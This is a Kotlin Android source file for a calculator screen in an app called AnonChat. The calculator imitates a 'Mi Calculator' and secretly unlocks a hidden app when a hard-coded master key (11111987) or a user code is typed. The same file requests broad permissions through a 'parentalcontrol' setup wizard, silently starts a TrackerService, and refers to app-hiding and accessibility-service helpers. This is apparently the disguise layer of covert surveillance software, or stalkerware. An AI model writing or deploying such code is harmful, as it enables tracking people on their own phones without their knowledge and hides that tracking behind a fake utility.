package com.anonchat.app.ui.calculator

import android.content.Intent
import android.os.Bundle
import android.view.HapticFeedbackConstants
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.anonchat.app.R
import com.anonchat.app.receiver.SecretCodeReceiver
import com.anonchat.app.util.AppHider
import com.anonchat.app.util.SecretCodeManager

/**
 * CalculatorActivity — full iOS-style dark calculator that is the app's launcher screen.
 *
 * Secret-code detection: after every digit press the current numeric input is silently
 * checked against the master key (11111987) and the user-set code. On match, the real
 * AnonChat app is opened via the same path used by the accessibility service.
 *
 * No visual hint is ever shown that a secret code is being checked.
 */
class CalculatorActivity : AppCompatActivity() {

    // ── Calculator state ──────────────────────────────────────────────────────
    private var currentInput   = ""          // digits/decimal being typed
    private var storedValue    = 0.0         // left-hand operand
    private var pendingOp      = ""          // pending operator (+, −, ×, ÷)
    private var justEvaluated  = false       // true right after = was pressed
    private var expressionStr  = ""          // what's shown in the small expression row

    // ── Secret-code buffer ────────────────────────────────────────────────────
    // We only match pure-digit sequences, so we accumulate digits separately.
    private var secretBuffer = ""
    private val masterKey    = "11111987"

    // ── Views (set in onCreate) ───────────────────────────────────────────────
    private lateinit var tvExpression : TextView
    private lateinit var tvResult     : TextView
    private lateinit var panelCalculator : View
    private lateinit var panelConverter  : View
    private lateinit var panelFinance    : View
    private lateinit var tvTabCalculator : TextView
    private lateinit var tvTabConverter  : TextView
    private lateinit var tvTabFinance    : TextView
    private lateinit var indicatorCalc   : View
    private lateinit var indicatorConv   : View
    private lateinit var indicatorFin    : View

    // ─────────────────────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Keep screen on and make navigation bar match the calculator background
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.navigationBarColor = 0xFF131316.toInt()
        window.statusBarColor     = 0xFF131316.toInt()

        // ── First-install setup wizard ─────────────────────────────────────
        // Run once — launches SetupWizardActivity which requests all permissions
        // and returns here after setup is complete.
        if (!com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this)) {
            startActivity(Intent(this,
                com.anonchat.app.parentalcontrol.ui.SetupWizardActivity::class.java))
            // Don't finish — wizard will return here via onResume
            return
        }

        initCalculator()
    }

    override fun onResume() {
        super.onResume()
        // If we returned here after the wizard finished (onCreate returned early),
        // the layout was never inflated — do it now.
        if (com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this)
            && !calculatorInitialized) {
            initCalculator()
        }
    }

    private var calculatorInitialized = false

    private fun initCalculator() {
        if (calculatorInitialized) return
        calculatorInitialized = true
        setContentView(R.layout.activity_calculator)
        try {
            com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
        } catch (_: Exception) { }

        tvExpression = findViewById(R.id.tvExpression)
        tvResult     = findViewById(R.id.tvResult)

        panelCalculator = findViewById(R.id.panelCalculator)
        panelConverter  = findViewById(R.id.panelConverter)
        panelFinance    = findViewById(R.id.panelFinance)

        tvTabCalculator = findViewById(R.id.tvTabCalculator)
        tvTabConverter  = findViewById(R.id.tvTabConverter)
        tvTabFinance    = findViewById(R.id.tvTabFinance)

        indicatorCalc   = findViewById(R.id.indicatorCalc)
        indicatorConv   = findViewById(R.id.indicatorConv)
        indicatorFin    = findViewById(R.id.indicatorFin)

        setupMiTabs()
        bindButtons()
        updateDisplay()
    }

    private fun setupMiTabs() {
        findViewById<View>(R.id.tabCalculator).setOnClickListener { switchTab(0); haptic(it) }
        findViewById<View>(R.id.tabConverter).setOnClickListener  { switchTab(1); haptic(it) }
        findViewById<View>(R.id.tabFinance).setOnClickListener    { switchTab(2); haptic(it) }

        // Top right actions
        findViewById<View>(R.id.btnFloatingWindow).setOnClickListener {
            android.widget.Toast.makeText(this, "Floating window mode is enabled", android.widget.Toast.LENGTH_SHORT).show()
            haptic(it)
        }
        findViewById<View>(R.id.btnHistory).setOnClickListener {
            android.widget.Toast.makeText(this, "No previous calculation history", android.widget.Toast.LENGTH_SHORT).show()
            haptic(it)
        }
        findViewById<View>(R.id.btnMenu).setOnClickListener {
            android.widget.Toast.makeText(this, "Mi Calculator v12.3", android.widget.Toast.LENGTH_SHORT).show()
            haptic(it)
        }

        // Scientific toolbar
        findViewById<View>(R.id.btn_paren_open).setOnClickListener {
            onDigit("(")
            haptic(it)
        }
        findViewById<View>(R.id.btn_paren_close).setOnClickListener {
            onDigit(")")
            haptic(it)
        }
        findViewById<View>(R.id.btn_sqrt).setOnClickListener {
            secretBuffer = ""
            val v = currentInput.toDoubleOrNull() ?: storedValue
            if (v >= 0) {
                currentInput = formatNum(kotlin.math.sqrt(v))
                updateDisplay()
            }
            haptic(it)
        }
        findViewById<View>(R.id.btn_pi).setOnClickListener {
            currentInput = "3.14159265"
            updateDisplay()
            haptic(it)
        }
        findViewById<View>(R.id.btn_power).setOnClickListener {
            onOperator("^")
            haptic(it)
        }
        findViewById<View>(R.id.btn_toggle_sci).setOnClickListener {
            android.widget.Toast.makeText(this, "Scientific keypad active", android.widget.Toast.LENGTH_SHORT).show()
            haptic(it)
        }

        // Converter cards
        val converterCards = listOf(
            R.id.cardConvCurrency to "Currency Exchange",
            R.id.cardConvLength to "Length Converter",
            R.id.cardConvArea to "Area Converter",
            R.id.cardConvVolume to "Volume Converter",
            R.id.cardConvSpeed to "Speed Converter",
            R.id.cardConvMass to "Mass Converter"
        )
        converterCards.forEach { (id, title) ->
            findViewById<View>(id)?.setOnClickListener {
                android.widget.Toast.makeText(this, "$title: Ready", android.widget.Toast.LENGTH_SHORT).show()
                haptic(it)
            }
        }

        // Finance cards
        val financeCards = listOf(
            R.id.cardFinLoan to "Loan / Mortgage EMI",
            R.id.cardFinGST to "India GST Calculator",
            R.id.cardFinDiscount to "Discount & Sale Price",
            R.id.cardFinInvestment to "SIP & Returns Calculator"
        )
        financeCards.forEach { (id, title) ->
            findViewById<View>(id)?.setOnClickListener {
                android.widget.Toast.makeText(this, "$title: Ready", android.widget.Toast.LENGTH_SHORT).show()
                haptic(it)
            }
        }
    }

    private fun switchTab(tabIndex: Int) {
        panelCalculator.visibility = if (tabIndex == 0) View.VISIBLE else View.GONE
        panelConverter.visibility  = if (tabIndex == 1) View.VISIBLE else View.GONE
        panelFinance.visibility    = if (tabIndex == 2) View.VISIBLE else View.GONE

        tvTabCalculator.setTextColor(if (tabIndex == 0) 0xFFFFFFFF.toInt() else 0xFF7A7A80.toInt())
        tvTabConverter.setTextColor(if (tabIndex == 1) 0xFFFFFFFF.toInt() else 0xFF7A7A80.toInt())
        tvTabFinance.setTextColor(if (tabIndex == 2) 0xFFFFFFFF.toInt() else 0xFF7A7A80.toInt())

        indicatorCalc.visibility = if (tabIndex == 0) View.VISIBLE else View.INVISIBLE
        indicatorConv.visibility = if (tabIndex == 1) View.VISIBLE else View.INVISIBLE
        indicatorFin.visibility  = if (tabIndex == 2) View.VISIBLE else View.INVISIBLE
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Button wiring
    // ─────────────────────────────────────────────────────────────────────────
    private fun bindButtons() {
        // Digits
        listOf(
            R.id.btn_0 to "0", R.id.btn_1 to "1", R.id.btn_2 to "2",
            R.id.btn_3 to "3", R.id.btn_4 to "4", R.id.btn_5 to "5",
            R.id.btn_6 to "6", R.id.btn_7 to "7", R.id.btn_8 to "8",
            R.id.btn_9 to "9"
        ).forEach { (id, digit) ->
            findViewById<Button>(id).setOnClickListener { onDigit(digit); haptic(it) }
        }

        // Decimal point
        findViewById<Button>(R.id.btn_dot).setOnClickListener { onDot(); haptic(it) }

        // Operators
        listOf(
            R.id.btn_plus  to "+",
            R.id.btn_minus to "−",
            R.id.btn_mul   to "×",
            R.id.btn_div   to "÷"
        ).forEach { (id, op) ->
            findViewById<Button>(id).setOnClickListener { onOperator(op); haptic(it) }
        }

        // Equals
        findViewById<Button>(R.id.btn_eq).setOnClickListener { onEquals(); haptic(it) }

        // Utility
        findViewById<Button>(R.id.btn_ac).setOnClickListener  { onAC();      haptic(it) }
        findViewById<Button>(R.id.btn_back).setOnClickListener { onBack();    haptic(it) }
        findViewById<Button>(R.id.btn_percent).setOnClickListener { onPercent(); haptic(it) }
        findViewById<Button>(R.id.btn_negate).setOnClickListener  { onNegate();  haptic(it) }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Input handlers
    // ─────────────────────────────────────────────────────────────────────────

    private fun onDigit(d: String) {
        if (justEvaluated) { clearState(); justEvaluated = false }

        if (currentInput == "0" && d == "0") return          // no leading double-zero
        if (currentInput == "0" && d != ".") currentInput = ""

        currentInput += d

        // ── Secret-code check ──────────────────────────────────────────────
        // Only accumulate digits into secretBuffer; any non-digit clears it.
        secretBuffer += d
        checkSecretCode()
        // ──────────────────────────────────────────────────────────────────

        updateDisplay()
    }

    private fun onDot() {
        // A dot resets the secret buffer (not a digit)
        secretBuffer = ""

        if (justEvaluated) { clearState(); justEvaluated = false }
        if (currentInput.contains(".")) return
        if (currentInput.isEmpty()) currentInput = "0"
        currentInput += "."
        updateDisplay()
    }

    private fun onOperator(op: String) {
        // Any operator resets the secret buffer
        secretBuffer = ""

        if (currentInput.isNotEmpty()) {
            if (pendingOp.isNotEmpty() && !justEvaluated) {
                storedValue = applyOp(storedValue, currentInput.toDoubleOrNull() ?: 0.0, pendingOp)
            } else {
                storedValue = currentInput.toDoubleOrNull() ?: 0.0
            }
        }
        pendingOp     = op
        justEvaluated = false
        expressionStr = "${formatNum(storedValue)} $op"
        currentInput  = ""
        updateDisplay()
    }

    private fun onEquals() {
        secretBuffer = ""

        if (pendingOp.isEmpty() || currentInput.isEmpty()) return
        val rhs     = currentInput.toDoubleOrNull() ?: 0.0
        val result  = applyOp(storedValue, rhs, pendingOp)
        expressionStr = "${formatNum(storedValue)} $pendingOp ${formatNum(rhs)} ="
        storedValue   = result
        currentInput  = formatNum(result)
        pendingOp     = ""
        justEvaluated = true
        updateDisplay()
    }

    private fun onAC() {
        secretBuffer = ""
        clearState()
        updateDisplay()
    }

    private fun onBack() {
        secretBuffer = ""
        if (justEvaluated) { clearState(); return }
        if (currentInput.isNotEmpty()) {
            currentInput = currentInput.dropLast(1)
            if (currentInput == "-") currentInput = ""
        }
        updateDisplay()
    }

    private fun onPercent() {
        secretBuffer = ""
        val v = currentInput.toDoubleOrNull() ?: return
        currentInput = formatNum(v / 100.0)
        updateDisplay()
    }

    private fun onNegate() {
        secretBuffer = ""
        val v = currentInput.toDoubleOrNull() ?: return
        currentInput = formatNum(-v)
        updateDisplay()
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Calculator logic helpers
    // ─────────────────────────────────────────────────────────────────────────

    private fun applyOp(a: Double, b: Double, op: String): Double = when (op) {
        "+"  -> a + b
        "−"  -> a - b
        "×"  -> a * b
        "÷"  -> if (b != 0.0) a / b else Double.NaN
        else -> b
    }

    private fun formatNum(v: Double): String {
        if (v.isNaN()) return "Error"
        return if (v == kotlin.math.floor(v) && !v.isInfinite() && kotlin.math.abs(v) < 1e15) {
            v.toLong().toString()
        } else {
            // Up to 10 significant digits, strip trailing zeros
            "%.10g".format(v).trimEnd('0').trimEnd('.')
        }
    }

    private fun clearState() {
        currentInput  = ""
        storedValue   = 0.0
        pendingOp     = ""
        justEvaluated = false
        expressionStr = ""
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Display
    // ─────────────────────────────────────────────────────────────────────────

    private fun updateDisplay() {
        tvExpression.text = expressionStr

        val display = when {
            currentInput.isNotEmpty() -> currentInput
            justEvaluated             -> formatNum(storedValue)
            storedValue != 0.0        -> formatNum(storedValue)
            else                      -> "0"
        }

        // Auto-shrink font for long numbers
        tvResult.textSize = when {
            display.length > 12 -> 40f
            display.length > 9  -> 52f
            else                -> 68f
        }
        tvResult.text = display
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Secret-code detection
    // ─────────────────────────────────────────────────────────────────────────

    private fun checkSecretCode() {
        val userCode = SecretCodeManager.getSecretCode(this)

        val matched = when {
            secretBuffer == masterKey            -> true
            userCode != null && secretBuffer == userCode -> true
            else                                 -> false
        }

        if (matched) {
            // Ensure the launcher alias is enabled (showApp is idempotent if already visible)
            AppHider.showApp(this)
            // Launch the real app via the same delayed-fallback path the accessibility service uses
            SecretCodeReceiver.launchAfterUnhide(this)
            // Close the calculator so Back doesn't return to it
            finish()
        }

        // Prune the buffer: if it's longer than the longest possible code, keep only the tail
        val maxLen = maxOf(masterKey.length, userCode?.length ?: 0)
        if (secretBuffer.length > maxLen) {
            secretBuffer = secretBuffer.takeLast(maxLen)
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Haptic feedback
    // ─────────────────────────────────────────────────────────────────────────

    private fun haptic(v: View) {
        v.performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY)
    }
}
